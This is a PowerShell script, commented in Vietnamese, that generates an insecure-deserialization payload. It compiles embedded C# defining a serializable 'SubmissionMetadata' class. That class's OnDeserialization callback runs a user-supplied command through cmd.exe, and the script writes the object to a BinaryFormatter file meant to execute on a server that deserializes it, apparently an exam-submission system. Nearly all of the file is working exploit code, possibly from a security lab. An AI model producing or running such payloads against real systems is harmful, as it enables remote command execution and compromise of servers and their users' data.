# PowerShell script để tạo payload Insecure Deserialization
# Cách sử dụng: .\CreatePayload.ps1 -Command "whoami" -OutputFile "payload.bin"

param(
    [Parameter(Mandatory=$true)]
    [string]$Command,
    
    [Parameter(Mandatory=$false)]
    [string]$OutputFile = "payload.bin"
)

Write-Host "=== Payload Generator cho Insecure Deserialization ===" -ForegroundColor Cyan
Write-Host ""

# Tạo C# code tạm thời
$csharpCode = @"
using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

[Serializable]
public class SubmissionMetadata : IDeserializationCallback
{
    public int ExamId { get; set; }
    public int StudentId { get; set; }
    public string? Notes { get; set; }
    public DateTime? SubmittedAt { get; set; }
    public string? Command { get; set; }
    
    public void OnDeserialization(object? sender)
    {
        if (!string.IsNullOrEmpty(Command))
        {
            try
            {
                var process = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/c " + Command,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                process.WaitForExit();
            }
            catch { }
        }
    }
}

class Program
{
    static void Main(string[] args)
    {
        var payload = new SubmissionMetadata
        {
            ExamId = 1,
            StudentId = 999,
            Notes = "Malicious payload",
            SubmittedAt = DateTime.Now,
            Command = "$Command"
        };
        
        using (var stream = new FileStream("$OutputFile", FileMode.Create))
        {
#pragma warning disable SYSLIB0011
            var formatter = new BinaryFormatter();
            formatter.Serialize(stream, payload);
#pragma warning restore SYSLIB0011
        }
        
        Console.WriteLine("Payload created: $OutputFile");
    }
}
"@

# Lưu code vào file tạm
$tempFile = "temp_payload_gen.cs"
$csharpCode | Out-File -FilePath $tempFile -Encoding UTF8

Write-Host "Đang compile và tạo payload..." -ForegroundColor Yellow

try {
    # Tìm C# compiler
    $compiler = $null
    $cscPath = $null
    
    # Thử tìm .NET Framework compiler (64-bit)
    if (Test-Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe") {
        $cscPath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        Write-Host "Tìm thấy C# compiler: $cscPath" -ForegroundColor Green
    }
    # Thử tìm .NET Framework compiler (32-bit)
    elseif (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        $cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        Write-Host "Tìm thấy C# compiler: $cscPath" -ForegroundColor Green
    }
    # Thử tìm .NET SDK
    elseif (Get-Command dotnet -ErrorAction SilentlyContinue) {
        Write-Host "Sử dụng dotnet để compile..." -ForegroundColor Yellow
        $currentDir = Get-Location
        $tempDir = Join-Path $currentDir "TempPayloadGen"
        
        if (Test-Path $tempDir) {
            Remove-Item -Recurse -Force $tempDir
        }
        
        & dotnet new console -n TempPayloadGen -f net8.0 --force 2>$null | Out-Null
        Copy-Item $tempFile "$tempDir\Program.cs" -Force
        Set-Location $tempDir
        & dotnet build -c Release -q 2>$null | Out-Null
        
        if (Test-Path "bin\Release\net8.0\TempPayloadGen.exe") {
            & "bin\Release\net8.0\TempPayloadGen.exe"
            Set-Location $currentDir
            Remove-Item -Recurse -Force $tempDir
        } else {
            Set-Location $currentDir
            Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
            throw "Compilation failed với dotnet"
        }
        return
    } else {
        throw "Không tìm thấy C# compiler. Vui lòng cài đặt .NET Framework hoặc .NET SDK"
    }
    
    # Compile với csc.exe
    if ($cscPath) {
        Write-Host "Đang compile với csc.exe..." -ForegroundColor Yellow
        $exeFile = "PayloadGenerator.exe"
        & $cscPath $tempFile /out:$exeFile 2>&1 | Out-Null
        
        if (Test-Path $exeFile) {
            Write-Host "Compile thành công! Đang tạo payload..." -ForegroundColor Green
            & ".\$exeFile" $Command $OutputFile
            Remove-Item $exeFile -Force -ErrorAction SilentlyContinue
        } else {
            throw "Compilation failed với csc.exe"
        }
    }
    
    if (Test-Path $OutputFile) {
        $fileSize = (Get-Item $OutputFile).Length
        Write-Host ""
        Write-Host "✓ Payload đã được tạo thành công!" -ForegroundColor Green
        Write-Host "  File: $OutputFile" -ForegroundColor White
        Write-Host "  Kích thước: $fileSize bytes" -ForegroundColor White
        Write-Host "  Command: $Command" -ForegroundColor White
        Write-Host ""
        Write-Host "⚠ CẢNH BÁO: File này chứa mã độc!" -ForegroundColor Red
        Write-Host "  Khi file này được deserialize trên server, command sẽ được thực thi tự động." -ForegroundColor Yellow
    } else {
        Write-Host "✗ Không thể tạo payload. Vui lòng sử dụng PayloadGenerator.cs thủ công." -ForegroundColor Red
    }
} catch {
    Write-Host "✗ Lỗi: $_" -ForegroundColor Red
    Write-Host ""
    Write-Host "Vui lòng sử dụng PayloadGenerator.cs và compile thủ công:" -ForegroundColor Yellow
    Write-Host "  csc PayloadGenerator.cs" -ForegroundColor White
    Write-Host "  PayloadGenerator.exe `"$Command`" $OutputFile" -ForegroundColor White
} finally {
    # Cleanup
    if (Test-Path $tempFile) {
        Remove-Item $tempFile -Force
    }
}

